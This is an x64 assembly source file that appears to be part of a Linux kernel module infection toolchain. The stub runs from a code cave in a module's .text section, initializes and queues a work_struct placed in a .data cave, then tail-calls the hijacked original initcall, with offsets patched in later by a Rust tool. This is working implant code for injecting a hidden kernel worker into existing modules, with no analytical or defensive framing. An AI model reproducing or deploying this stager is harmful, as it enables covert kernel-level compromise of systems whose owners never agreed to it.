; lkm_stager.asm
; x64 initcall stub executed from a .text cave.
;
; This initializes the runtime KASLR-sensitive fields of a work_struct stored in
; a separate .data cave, queues it, then tail-calls the displaced original
; initcall. No code is executed from .data.
;
; Sentinels patched as i32 PC-relative offsets by Rust:
;   WORK_STRUCT_DISP_SENTINEL   0x11223344  disp32 for lea rdi,[rip+d]
;   LKM_WORKER_DISP_SENTINEL    0xAABBCCEE  disp32 for lea rax,[rip+d]
;   SCHEDULE_WORK_REL_SENTINEL  0xAABBCCDD  rel32 for call schedule_work
;   ORIGINAL_FN_REL_SENTINEL    0x12345678  rel32 for jmp original initcall

BITS 64

lkm_stager:
    push    rbp

    db      0x48, 0x8D, 0x3D
    dd      0x11223344
    lea     rax, [rdi + 8]
    mov     [rdi + 8], rax
    db      0x48, 0x8D, 0x05
    dd      0xAABBCCEE
    mov     [rdi + 24], rax

    db      0xE8
    dd      0xAABBCCDD

    pop     rbp

    db      0xE9
    dd      0x12345678
